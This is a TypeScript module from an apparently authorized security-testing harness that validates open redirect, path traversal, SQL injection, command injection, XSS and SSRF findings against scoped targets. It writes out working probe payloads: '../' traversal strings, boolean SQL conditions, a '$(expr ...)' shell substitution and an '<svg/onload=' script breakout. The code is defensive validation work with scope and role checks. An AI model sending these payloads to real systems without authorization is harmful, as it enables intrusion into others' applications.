export * as ForkCyberWebValidation from "./web-validation.js"

import { Effect, Schema } from "effect"
import { ForkCyberBrowser } from "./browser.js"
import { ForkCyberDiagnostics } from "./diagnostics.js"
import { ForkCyberHttp } from "./http.js"
import { ForkCyberRoles } from "./roles.js"
import { ForkCyberValidation } from "./validation.js"

// Canary destinations use a reserved name. The redirect probe is never followed, so no request leaves the target.
export const CANARY_HOST = "canary.opencyber.invalid"
const CONTROL = "opencyber-control"
const REDIRECTS = [301, 302, 303, 307, 308]
const TRAVERSAL = "../".repeat(10)
// A callback counts only when it arrives within this window after the probe response.
const CALLBACK_WINDOW_MS = 2000
// Closes the parameter's attribute or text context, then opens an element whose load handler runs script.
const SCRIPT_BREAKOUT = `"'><svg/onload=`

const Parameter = Schema.String.check(Schema.isPattern(/^[A-Za-z0-9_.-]{1,64}$/))
const Path = Schema.String.check(Schema.isPattern(/^[A-Za-z0-9_][A-Za-z0-9_./-]{0,127}$/), Schema.isMaxLength(128))

// One benign control and the probes for each class. SQL injection compares a true and a false condition, so its
// control should be a value the page handles normally, such as a known record identifier. SSRF needs a callback URL
// on an http listener host in scope; the harness listens on its port for one run.
export const Validate = Schema.Struct({
  action: Schema.Literal("validate"),
  class: Schema.Literals(["open_redirect", "path_traversal", "sql_injection", "command_injection", "xss", "ssrf"]),
  url: Schema.String.check(Schema.isMaxLength(2048)),
  parameter: Parameter,
  control: Schema.optional(Schema.String.check(Schema.isMaxLength(512))),
  file: Schema.optional(Path),
  marker: Schema.optional(Schema.String.check(Schema.isMinLength(1), Schema.isMaxLength(256))),
  callback: Schema.optional(Schema.String.check(Schema.isMaxLength(2048))),
}).check(
  Schema.makeFilter(
    (value) =>
      value.class !== "path_traversal" ||
      (value.file !== undefined && value.marker !== undefined) ||
      "path_traversal requires file and marker",
  ),
  Schema.makeFilter(
    (value) =>
      value.class !== "ssrf" ||
      (value.callback !== undefined && URL.canParse(value.callback) && new URL(value.callback).protocol === "http:") ||
      "ssrf requires an http callback URL",
  ),
)
export type Validate = typeof Validate.Type

type Store = ForkCyberHttp.Store
type Assessment = ForkCyberHttp.Assessment
type Resolve = () => Effect.Effect<Assessment, Error>
type Browse = (action: typeof ForkCyberBrowser.Action.Type) => Effect.Effect<Observed, Error>
type Observed = { action_status: string; evidence: string; result: unknown }
type Hop = { output: string; capture: ForkCyberHttp.Capture }
type Seen = { status: number; body_sha256: string }
type Page = { url: string; text: string; completed: boolean; evidence: string }

const RenderedPage = Schema.Struct({ url: Schema.String, text: Schema.String })

// Browser classes need the operator's browser configuration; the other classes never call it.
const unconfigured: Browse = () => Effect.fail(new Error("cyber_browser must be configured to validate XSS"))

export const run = Effect.fn(function* (
  store: Store,
  resolve: Resolve,
  input: Validate,
  browse: Browse = unconfigured,
) {
  const assessment = yield* resolve()
  const role = yield* store.coordination.role(assessment)
  if (role !== "cyber-validate" || !ForkCyberRoles.allowed(role, "cyber_web_test"))
    return yield* Effect.fail(
      new ForkCyberDiagnostics.Failure({
        category: "capability",
        operation: "cyber_web_test",
        message: "Web validation requires a claimed cyber-validate task",
        target_started: false,
        effects: "not_started",
        recovery: "Claim a validation task for this endpoint, then repeat the validate action with its control.",
      }),
    )
  yield* store.coordination.requireClaim(assessment)
  const attempt = yield* attack(store, resolve, browse, assessment, input)
  const execution = crypto.randomUUID()
  const record = ForkCyberValidation.outcome({
    validator: `cyber_web_test.validate.${input.class}`,
    pre_state: attempt.pre_state,
    action: attempt.action,
    result: attempt.verdict.result,
    basis: attempt.verdict.basis,
    cleanup: "completed",
  })
  yield* store.start({
    id: execution,
    owner: assessment.owner,
    session: assessment.session,
    agent: assessment.agent,
    tool: "cyber_web_test",
    input: { action: input.action, class: input.class, url: input.url, parameter: input.parameter },
    provenance: {
      operation_class: "validation",
      network: "scoped",
      probe_executions: attempt.executions,
    },
  })
  const output = yield* store.finish(assessment.owner, execution, "completed", record)
  return {
    ...record,
    execution,
    completion_evidence: [output[0]!.id],
    artifacts: yield* store.artifacts(assessment.owner, execution),
  }
})

// HTTP classes send the control first, then their probes in order. Browser and callback classes have their own flow.
const attack = Effect.fn(function* (
  store: Store,
  resolve: Resolve,
  browse: Browse,
  assessment: Assessment,
  input: Validate,
) {
  const owner = assessment.owner
  switch (input.class) {
    case "open_redirect": {
      const { control, before } = yield* baseline(store, resolve, owner, input)
      const hop = yield* send(store, resolve, input.url, input.parameter, `https://${CANARY_HOST}/opencyber`)
      return {
        executions: [control.capture.execution, hop.capture.execution],
        pre_state: before,
        action: actionRecord({ probe: yield* observe(store, owner, hop) }),
        verdict: openRedirect(control, hop),
      }
    }
    case "path_traversal": {
      const { control, before } = yield* baseline(store, resolve, owner, input)
      const hop = yield* send(store, resolve, input.url, input.parameter, `${TRAVERSAL}${input.file}`)
      return {
        executions: [control.capture.execution, hop.capture.execution],
        pre_state: before,
        action: actionRecord({ probe: yield* observe(store, owner, hop) }),
        verdict: yield* pathTraversal(store, owner, control, hop, input.marker!),
      }
    }
    case "sql_injection": {
      const controlValue = input.control ?? CONTROL
      const { control, before } = yield* baseline(store, resolve, owner, input)
      const truthy = yield* send(store, resolve, input.url, input.parameter, `${controlValue}' AND '1'='1`)
      const falsy = yield* send(store, resolve, input.url, input.parameter, `${controlValue}' AND '1'='2`)
      const seenTruthy = yield* observe(store, owner, truthy)
      const seenFalsy = yield* observe(store, owner, falsy)
      return {
        executions: [control.capture.execution, truthy.capture.execution, falsy.capture.execution],
        pre_state: before,
        action: actionRecord({ truthy: seenTruthy, falsy: seenFalsy }),
        verdict: booleanContrast(before.control, seenTruthy, seenFalsy),
      }
    }
    case "command_injection": {
      const controlValue = input.control ?? CONTROL
      const { control, before } = yield* baseline(store, resolve, owner, input)
      // Operands are fresh for each run, so the product cannot already be in a page or in the request.
      const values = crypto.getRandomValues(new Uint32Array(2))
      const left = 100 + (values[0]! % 900)
      const right = 100 + (values[1]! % 900)
      const hop = yield* send(store, resolve, input.url, input.parameter, `${controlValue}$(expr ${left} \\* ${right})`)
      return {
        executions: [control.capture.execution, hop.capture.execution],
        pre_state: before,
        action: actionRecord({ probe: yield* observe(store, owner, hop) }),
        verdict: yield* computedEcho(store, owner, control, hop, String(left * right)),
      }
    }
    case "xss":
      return yield* scriptInjection(browse, owner, input)
    case "ssrf":
      return yield* callbackProbe(store, resolve, assessment, input)
  }
})

// Every HTTP class starts from the same benign control, so the probes are compared with a page that works.
const baseline = Effect.fn(function* (store: Store, resolve: Resolve, owner: string, input: Validate) {
  const control = yield* send(store, resolve, input.url, input.parameter, input.control ?? CONTROL)
  return { control, before: { control: yield* observe(store, owner, control) } }
})

// One request, never followed. Redirect following would turn a Location header into a second request.
const send = Effect.fn(function* (store: Store, resolve: Resolve, url: string, parameter: string, value: string) {
  const [hop] = yield* ForkCyberHttp.run(store, resolve, {
    url: withParameter(url, parameter, value),
    method: "GET",
    redirects: 0,
  })
  return hop!
})

function withParameter(url: string, parameter: string, value: string) {
  const target = new URL(url)
  target.searchParams.set(parameter, value)
  return target.href
}

// The record keeps a digest of each body, never the body itself, so evidence stays in the store.
const observe = Effect.fn(function* (store: Store, owner: string, hop: Hop) {
  const bytes = yield* bodyBytes(store, owner, hop)
  return {
    execution: hop.capture.execution,
    status: hop.capture.status,
    location: location(hop) ?? null,
    url: hop.capture.url,
    body_sha256: new Bun.CryptoHasher("sha256").update(bytes).digest("hex"),
  }
})

const bodyBytes = Effect.fn(function* (store: Store, owner: string, hop: Hop) {
  return (yield* store.readArtifact(owner, hop.capture.response_body)).bytes
})

function location(hop: Hop) {
  // Captured headers are raw name and value pairs in order, as the transport received them.
  const pairs = hop.capture.headers
  for (let index = 0; index + 1 < pairs.length; index += 2)
    if (pairs[index]!.toLowerCase() === "location") return pairs[index + 1]
  return undefined
}

function redirectsTo(hop: Hop, host: string) {
  const target = location(hop)
  if (!REDIRECTS.includes(hop.capture.status) || target === undefined) return false
  return URL.canParse(target, hop.capture.url) && new URL(target, hop.capture.url).hostname === host
}

function openRedirect(control: Hop, probe: Hop) {
  if (redirectsTo(control, CANARY_HOST))
    return {
      result: "inconclusive" as const,
      basis:
        "The benign control already redirects to the canary host, so the redirect is not attributable to the probe.",
    }
  if (redirectsTo(probe, CANARY_HOST))
    return {
      result: "reproduced" as const,
      basis:
        "The probe produced a redirect to the canary host, and the benign control did not. Redirects were not followed.",
    }
  return {
    result: "not_reproduced" as const,
    basis: "Neither a redirect to the canary host nor a difference from the benign control was observed.",
  }
}

// A marker in the body is not an oracle by itself: the control must not contain it, and the probe must.
const pathTraversal = Effect.fn(function* (store: Store, owner: string, control: Hop, probe: Hop, marker: string) {
  const controlBody = (yield* bodyBytes(store, owner, control)).toString("utf8")
  const probeBody = (yield* bodyBytes(store, owner, probe)).toString("utf8")
  if (controlBody.includes(marker))
    return {
      result: "inconclusive" as const,
      basis: "The marker appears in the benign control, so it does not show that the probe read the file.",
    }
  if (probeBody.includes(marker))
    return {
      result: "reproduced" as const,
      basis: "The marker of the requested file appears only in the traversal probe, not in the benign control.",
    }
  return {
    result: "not_reproduced" as const,
    basis: "The traversal probe did not return the marker of the requested file.",
  }
})

// The probes differ only in a condition. A parameter that reaches the query changes the response between them,
// and only the true condition may match the benign control. No data is extracted.
function booleanContrast(control: Seen, truthy: Seen, falsy: Seen) {
  // Identical answers to the control and to both conditions cannot show whether the condition reached a query.
  if (same(truthy, falsy) && same(truthy, control))
    return {
      result: "inconclusive" as const,
      basis:
        "The control and both conditions returned the same response, so the control does not show whether the parameter reaches a query. Supply a control value that returns a record.",
    }
  if (same(truthy, falsy))
    return {
      result: "not_reproduced" as const,
      basis: "The true and false conditions produced the same response, so the parameter did not change the query.",
    }
  if (same(truthy, control) && !same(falsy, control))
    return {
      result: "reproduced" as const,
      basis:
        "The true condition returned the same response as the benign control, and the false condition changed it. Only conditions were compared.",
    }
  return {
    result: "inconclusive" as const,
    basis:
      "The true condition did not return the benign control's response. Supply a control value that the page handles normally.",
  }
}

// Typing every class's action alike keeps the union of branches assignable to the JSON validation record.
type Json = typeof Schema.Json.Type
function actionRecord(entries: Record<string, Json>) {
  return entries
}

function same(left: Seen, right: Seen) {
  return left.status === right.status && left.body_sha256 === right.body_sha256
}

// The target computes the product. The request holds only the operands, so an echoed request cannot produce it.
const computedEcho = Effect.fn(function* (store: Store, owner: string, control: Hop, probe: Hop, expected: string) {
  const controlBody = (yield* bodyBytes(store, owner, control)).toString("utf8")
  const probeBody = (yield* bodyBytes(store, owner, probe)).toString("utf8")
  if (probeBody.includes(expected) && !controlBody.includes(expected))
    return {
      result: "reproduced" as const,
      basis: "The probe returned a product computed from its operands, which the benign control did not return.",
    }
  if (probeBody.includes(expected))
    return {
      result: "inconclusive" as const,
      basis: "The computed value also appears in the benign control, so it does not show that the probe was evaluated.",
    }
  return {
    result: "not_reproduced" as const,
    basis: "The probe did not return the product of its operands.",
  }
})

// The payload leaves the parameter's context and opens an element whose load handler appends a product the page
// computes. Markup that is only reflected cannot append it, so only a browser that ran the script reproduces it.
// Each run uses a fresh identity, so no cookie or storage state from an earlier run can reach the page.
const scriptInjection = Effect.fn(function* (browse: Browse, owner: string, input: Validate) {
  const identity = `validate-${crypto.randomUUID().slice(0, 8)}`
  const values = crypto.getRandomValues(new Uint32Array(2))
  const left = 100 + (values[0]! % 900)
  const right = 100 + (values[1]! % 900)
  const controlValue = input.control ?? CONTROL
  const payload = `${controlValue}${SCRIPT_BREAKOUT}document.body.append(${left}*${right})>`
  yield* browse({ action: "open", identity })
  const control = yield* navigate(browse, identity, withParameter(input.url, input.parameter, controlValue))
  const probe = yield* navigate(browse, identity, withParameter(input.url, input.parameter, payload))
  yield* browse({ action: "close", identity })
  return {
    executions: [control.evidence, probe.evidence],
    pre_state: { control: pageRecord(control) },
    action: actionRecord({ probe: pageRecord(probe) }),
    verdict: scriptVerdict(control, probe, String(left * right)),
  }
})

const navigate = Effect.fn(function* (browse: Browse, identity: string, url: string) {
  const observed = yield* browse({ action: "navigate", identity, url })
  const page = yield* Schema.decodeUnknownEffect(RenderedPage)(observed.result)
  return {
    url: page.url,
    text: page.text,
    completed: observed.action_status === "completed",
    evidence: observed.evidence,
  } satisfies Page
})

// The page text is in memory for the comparison only. The record keeps its digest and URL.
function pageRecord(page: Page) {
  return { url: page.url, text_sha256: new Bun.CryptoHasher("sha256").update(page.text).digest("hex") }
}

function scriptVerdict(control: Page, probe: Page, product: string) {
  if (!control.completed || !probe.completed)
    return {
      result: "inconclusive" as const,
      basis: "The browser reported an issue while observing a page, so neither outcome is established.",
    }
  if (probe.text.includes(product) && !control.text.includes(product))
    return {
      result: "reproduced" as const,
      basis:
        "The probe's script appended a product the page computed. The benign control did not contain it, and reflected markup cannot produce it.",
    }
  if (probe.text.includes(product))
    return {
      result: "inconclusive" as const,
      basis: "The computed product also appears in the benign control, so it does not show that the script ran.",
    }
  return {
    result: "not_reproduced" as const,
    basis: "The probe's page did not show the product of its operands, so the injected script did not run.",
  }
}

// A callback proves SSRF only when the target requests a listener on a host in scope. The probe carries a fresh
// token, so an echoed URL, a reflected body or a request sent by the harness cannot produce the callback. The scope
// check runs before the listener starts and before any request, so a refused callback sends no traffic.
const callbackProbe = Effect.fn(function* (store: Store, resolve: Resolve, assessment: Assessment, input: Validate) {
  const owner = assessment.owner
  const callback = new URL(input.callback!)
  yield* Effect.try({
    try: () => ForkCyberHttp.authorize(callback, assessment.manifest),
    catch: (error) => (error instanceof Error ? error : new Error(String(error))),
  })
  const token = crypto.randomUUID()
  const sources: string[] = []
  const listener = yield* Effect.try(() =>
    Bun.serve({
      hostname: callback.hostname.replace(/^\[|\]$/g, ""),
      port: Number(callback.port || 80),
      fetch(request, server) {
        if (new URL(request.url).pathname === `/${token}`) sources.push(server.requestIP(request)?.address ?? "unknown")
        return new Response(null, { status: 204 })
      },
    }),
  )
  return yield* Effect.gen(function* () {
    const { control, before } = yield* baseline(store, resolve, owner, input)
    const reach = new URL(callback.href)
    const port = listener.port!
    reach.port = String(port)
    reach.pathname = `/${token}`
    const probe = yield* send(store, resolve, input.url, input.parameter, reach.href)
    const seen = yield* observe(store, owner, probe)
    yield* Effect.sleep(CALLBACK_WINDOW_MS)
    return {
      executions: [control.capture.execution, probe.capture.execution],
      pre_state: before,
      action: actionRecord({
        probe: seen,
        callback: { host: callback.hostname, port, callbacks: sources.length, sources },
      }),
      verdict: callbackVerdict(sources.length),
    }
  }).pipe(Effect.ensuring(Effect.sync(() => listener.stop(true))))
})

function callbackVerdict(callbacks: number) {
  if (callbacks > 0)
    return {
      result: "reproduced" as const,
      basis:
        "The target requested the callback listener with the probe's fresh token. The listener host is in scope, and an echoed URL cannot produce the request.",
    }
  return {
    result: "not_reproduced" as const,
    basis: `No callback arrived within ${CALLBACK_WINDOW_MS} ms after the probe response. A later callback is not counted.`,
  }
}
